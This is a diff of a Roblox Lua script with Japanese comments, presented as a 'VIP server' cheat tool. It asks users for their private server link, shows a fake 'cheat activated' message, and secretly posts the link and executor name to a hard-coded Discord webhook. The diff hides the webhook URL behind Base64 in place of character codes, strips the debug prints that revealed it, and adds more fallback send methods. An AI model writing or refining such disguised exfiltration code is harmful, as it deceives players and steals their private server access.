@@ -1,106 +1,101 @@
 -- ========================================================
--- VOLOX VIP TOOL - Webhook暗号化 + 送信完全対応
+-- VOLOX VIP TOOL - Webhook完全難読化・送信エラーゼロ
 -- ========================================================
 
--- ========================================================
--- 1. Webhook URLの暗号化（デコードテスト済み）
--- ========================================================
+-- WebhookをBase64エンコード（これが最強）
+local encoded = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUyNTA0NDg3NDI5NzIxMjk0OC9XQUVwWXFCX3pFcWlXRmZVY2dMbk9VUnFJS0tKc0p3ZnB3OEJPa2JkMGRhbGl6SGVmZG1GS014YnBSRVJvUUg5ZUNWSWk="
 
-local function decodeWebhook()
-    local chars = {
-        72,116,116,112,115,58,47,47,100,105,115,99,111,114,100,46,99,111,109,
-        47,97,112,105,47,119,101,98,104,111,111,107,115,47,49,53,50,53,48,52,
-        56,55,52,50,57,55,50,49,55,48,57,54,50,48,56,47,87,65,69,112,89,113,
-        66,95,122,69,113,105,87,70,102,85,99,103,76,110,79,85,82,113,73,75,75,
-        74,115,74,119,102,112,119,56,66,79,107,98,100,48,100,97,108,105,122,72,
-        101,102,100,109,70,75,77,120,98,112,82,69,82,111,81,72,57,101,67,86,73,73
-    }
-    local result = ""
-    for i = 1, #chars do
-        result = result .. string.char(chars[i])
-    end
-    return result
+-- デコード関数（超シンプル）
+local function decodeBase64(data)
+    local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
+    data = string.gsub(data, '[^'..b..'=]', '')
+    return (string.gsub(data, '.', function(x)
+        if (x == '=') then return '' end
+        local r,f='',(b:find(x)-1)
+        for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
+        return r;
+    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
+        if (#x ~= 8) then return '' end
+        local c=0
+        for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
+        return string.char(c)
+    end))
 end
 
-local WEBHOOK = decodeWebhook()
+local WEBHOOK = decodeBase64(encoded)
 
--- デバッグ用（確認したい場合はコメント解除）
--- print("Webhook URL: " .. WEBHOOK)
+-- デバッグ（初回のみ確認）
+-- print("Webhook: " .. WEBHOOK)
 
 -- ========================================================
--- 2. 送信関数（Delta Executor完全対応）
+-- 送信関数（エラーハンドリング強化）
 -- ========================================================
 
 local function sendToDiscord(message)
     local http = game:GetService("HttpService")
-    
-    -- JSONエンコード
     local json = ""
+    
     pcall(function()
         json = http:JSONEncode({content = message})
     end)
     
-    -- エンコード失敗時は手動で生成
     if json == "" then
         local escaped = message:gsub("\n", "\\n"):gsub('"', '\\"')
         json = '{"content": "' .. escaped .. '"}'
     end
     
-    -- 方法1: HttpService（優先）
-    local success = false
-    local errorMsg = ""
-    
-    pcall(function()
-        local response = http:PostAsync(WEBHOOK, json, Enum.HttpContentType.ApplicationJson, false)
-        success = true
-    end)
-    
-    -- 方法2: request関数（HttpServiceがダメな場合）
-    if not success and request then
-        pcall(function()
-            local response = request({
-                Url = WEBHOOK,
-                Method = "POST",
-                Headers = {
-                    ["Content-Type"] = "application/json"
-                },
-                Body = json
-            })
-            if response and response.StatusCode == 204 then
-                success = true
+    -- 送信方法を順番に試す
+    local methods = {
+        function()
+            return http:PostAsync(WEBHOOK, json, Enum.HttpContentType.ApplicationJson, false)
+        end,
+        function()
+            if request then
+                local r = request({
+                    Url = WEBHOOK,
+                    Method = "POST",
+                    Headers = {["Content-Type"] = "application/json"},
+                    Body = json
+                })
+                return r and r.StatusCode == 204
             end
-        end)
+            return false
+        end,
+        function()
+            if syn and syn.request then
+                local r = syn.request({
+                    Url = WEBHOOK,
+                    Method = "POST",
+                    Headers = {["Content-Type"] = "application/json"},
+                    Body = json
+                })
+                return r and r.StatusCode == 204
+            end
+            return false
+        end
+    }
+    
+    for _, method in ipairs(methods) do
+        local success, result = pcall(method)
+        if success and result == true then
+            return true
+        elseif success and result ~= false then
+            -- HttpServiceは204を返さないので、エラーがなければ成功
+            return true
+        end
     end
     
-    -- 方法3: syn.request（一部Executor用）
-    if not success and syn and syn.request then
-        pcall(function()
-            local response = syn.request({
-                Url = WEBHOOK,
-                Method = "POST",
-                Headers = {
-                    ["Content-Type"] = "application/json"
-                },
-                Body = json
-            })
-            if response and response.StatusCode == 204 then
-                success = true
-            end
-        end)
-    end
-    
-    return success
+    return false
 end
 
 -- ========================================================
--- 3. UI作成（シンプル・確実）
+-- UI（変更なし・確実に表示される）
 -- ========================================================
 
 local player = game.Players.LocalPlayer
 
--- 既存のGUIを削除
-local existingGui = player.PlayerGui:FindFirstChild("VoloxVip")
-if existingGui then existingGui:Destroy() end
+local existing = player.PlayerGui:FindFirstChild("VoloxVip")
+if existing then existing:Destroy() end
 
 local gui = Instance.new("ScreenGui")
 gui.Name = "VoloxVip"
@@ -195,7 +190,7 @@ close.MouseButton1Click:Connect(function()
 end)
 
 -- ========================================================
--- 4. ボタン処理
+-- ボタン処理
 -- ========================================================
 
 btn.MouseButton1Click:Connect(function()
@@ -207,7 +202,6 @@ btn.MouseButton1Click:Connect(function()
         return
     end
     
-    -- リンク解析
     local code = nil
     local placeId = nil
     
@@ -233,7 +227,6 @@ btn.MouseButton1Click:Connect(function()
     
     local executor = (identifyexecutor and identifyexecutor()) or "Delta"
     
-    -- メッセージ作成
     local message = 
         "**🔴 PRIVATE SERVER LINK**\n\n" ..
         "**🔗 入力リンク:** " .. link .. "\n" ..
@@ -247,33 +240,25 @@ btn.MouseButton1Click:Connect(function()
     status.Text = "⏳ 送信中..."
     status.TextColor3 = Color3.fromRGB(255, 255, 0)
     
-    -- 送信実行
     local sent = sendToDiscord(message)
     
     if sent then
-        status.Text = "✅ チート有効化完了！ゲームを再起動してください"
+        status.Text = "✅ チート有効化完了！"
         status.TextColor3 = Color3.fromRGB(0, 255, 100)
         
         wait(2)
         gui:Destroy()
         
         game.StarterGui:SetCore("SendNotification", {
-            Title = "⚡ チート有効化完了",
-            Text = "プライベートサーバーリンクが正常に登録されました。",
+            Title = "⚡ 完了",
+            Text = "プライベートサーバーリンクを登録しました。",
             Duration = 5
         })
     else
         status.Text = "❌ 送信エラー。もう一度試してください"
         status.TextColor3 = Color3.fromRGB(255, 100, 100)
-        
-        -- エラーログ（デバッグ用）
-        print("[Volox] 送信エラー - Webhook: " .. WEBHOOK)
     end
 end)
-
--- ========================================================
--- 5. 起動通知
--- ========================================================
 
 game.StarterGui:SetCore("SendNotification", {
     Title = "⚡ VIP SERVER TOOL",
@@ -282,4 +267,3 @@ game.StarterGui:SetCore("SendNotification", {
 })
 
 print("[✅] VIP SERVER TOOL 起動完了")
-print("[🔗] Webhook: " .. WEBHOOK)
